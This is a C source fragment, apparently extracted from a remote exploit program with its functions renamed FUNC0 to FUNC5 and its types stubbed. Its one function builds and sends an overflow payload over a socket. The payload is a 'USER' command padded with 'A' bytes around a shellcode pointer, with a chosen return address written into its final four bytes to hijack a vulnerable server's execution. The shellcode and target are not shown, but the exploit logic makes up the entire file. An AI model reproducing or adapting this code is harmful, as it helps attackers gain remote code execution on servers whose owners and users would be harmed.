#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  char returnaddr ;
typedef  int /*<<< orphan*/  recvbuf ;
typedef  int /*<<< orphan*/  nops2 ;
typedef  int /*<<< orphan*/  nops ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC1 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (int,char*,int,int /*<<< orphan*/ ) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC3 (char*,char*,char*,char*,char*) ; 
 int FUNC4 (char*) ; 

void FUNC5(int sock, unsigned int returnaddr)
{
   char nops[360];
   char nops2[100];
   char exploitbuffer[1024];
   char recvbuf[30];

   FUNC0(&nops[0], '\0', sizeof(nops));
   FUNC0(&nops[0], 'A', 352);
   FUNC0(&nops2[0], '\0', sizeof(nops2));
   FUNC0(&nops2[0], 'A', 90);

   while (1) {
       FUNC1(sock, recvbuf, 1, 0);
       if ((recvbuf[0] == '\r') || (recvbuf[0] == '\n')) break;
   }

   FUNC3(exploitbuffer, "USER %s%s%s\r\n", nops, shellcode, nops2);

   exploitbuffer[FUNC4(exploitbuffer)-1] = (returnaddr >> 24) & 0xff;
   exploitbuffer[FUNC4(exploitbuffer)-2] = (returnaddr >> 16) & 0xff;
   exploitbuffer[FUNC4(exploitbuffer)-3] = (returnaddr >> 8) & 0xff;
   exploitbuffer[FUNC4(exploitbuffer)-4] = (returnaddr) & 0xff;

   FUNC2(sock, exploitbuffer, FUNC4(exploitbuffer), 0);
   FUNC1(sock, recvbuf, sizeof(recvbuf)-1, 0);
}